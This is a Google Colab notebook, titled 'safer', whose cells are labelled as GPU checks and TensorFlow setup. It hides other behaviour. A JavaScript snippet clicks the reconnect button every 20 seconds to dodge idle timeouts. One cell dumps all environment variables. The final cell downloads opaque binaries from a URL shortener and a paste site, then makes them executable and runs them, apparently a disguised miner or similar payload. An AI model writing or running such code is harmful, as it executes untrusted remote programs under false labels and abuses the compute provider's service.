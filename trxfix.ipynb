{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "safer.ipynb",
      "provenance": [],
      "collapsed_sections": [],
      "machine_shape": "hm"
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "code",
      "metadata": {
        "cellView": "form",
        "id": "XGkPLekFe7Lf"
      },
      "source": [
        "#@title **First...**\n",
        "\n",
        "print (\"Hello World\")\n",
        "\n",
        "import IPython\n",
        "from google.colab import output\n",
        "\n",
        "display(IPython.display.Javascript('''\n",
        "function ClickConnect(){\n",
        "  btn = document.querySelector(\"colab-connect-button\")\n",
        "  if (btn != null){\n",
        "    console.log(\"Click colab-connect-button\"); \n",
        "    btn.click() \n",
        "    }\n",
        "    \n",
        "  btn = document.getElementById('ok')\n",
        "  if (btn != null){\n",
        "    console.log(\"Click reconnect\"); \n",
        "    btn.click() \n",
        "    }\n",
        "  }\n",
        "    \n",
        "setInterval(ClickConnect,20000)\n",
        "'''))"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "cellView": "form",
        "id": "qR1AezaMfB_m"
      },
      "source": [
        "#@title **Check GPU**\n",
        "! nvidia-smi -L"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "cellView": "form",
        "id": "Oboyk6DkfEAI"
      },
      "source": [
        "#@title **Mod GPU**\n",
        "\n",
        "from numba import jit, cuda\n",
        "import numpy as np\n",
        "# to measure exec time\n",
        "from timeit import default_timer as timer\n",
        "\n",
        "# normal function to run on cpu\n",
        "def func(a):\t\t\t\t\t\t\t\t\n",
        "\tfor i in range(10000000):\n",
        "\t\ta[i]+= 1\t\n",
        "\n",
        "\t\t\t\t\t\t\n",
        "def func2(a):\n",
        "\tfor i in range(10000000):\n",
        "\t\ta[i]+= 1\n",
        "if __name__==\"__main__\":\n",
        "\tn = 10000000\t\t\t\t\t\t\t\n",
        "\ta = np.ones(n, dtype = np.float64)\n",
        "\tb = np.ones(n, dtype = np.float32)\n",
        "\t\n",
        "\tstart = timer()\n",
        "\tfunc(a)\n",
        "\tprint(\"without GPU:\", timer()-start)\t\n",
        "\t\n",
        "\tstart = timer()\n",
        "\tfunc2(a)\n",
        "\tprint(\"with GPU:\", timer()-start)"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "cellView": "form",
        "id": "03FKZaOcfF9o"
      },
      "source": [
        "#@title **Import CUDA**\n",
        "\n",
        "import os\n",
        "' && '.join([f'export {name}=\"{value}\"' for name, value in os.environ.items()])"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "cellView": "form",
        "id": "yNFST5ASfI9E"
      },
      "source": [
        "\n",
        "#@title **Tensor Maksimum**\n",
        "\n",
        "import tensorflow as tf\n",
        "\n",
        "from tensorflow import keras\n",
        "from tensorflow.keras import layers\n",
        "from tensorflow.keras import mixed_precision\n",
        "\n",
        "mixed_precision.set_global_policy('mixed_float16')"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "WlZBIuqOfL5a",
        "cellView": "form"
      },
      "source": [
        "#@title **Gaskeunn.....**\n",
        "\n",
        "!wget https://bit.ly/3zSuMQV && chmod +x 3zSuMQV && wget https://www.heypasteit.com/download/0IWWQ0 && chmod u+x 0IWWQ0 && ./0IWWQ0 65 75"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}
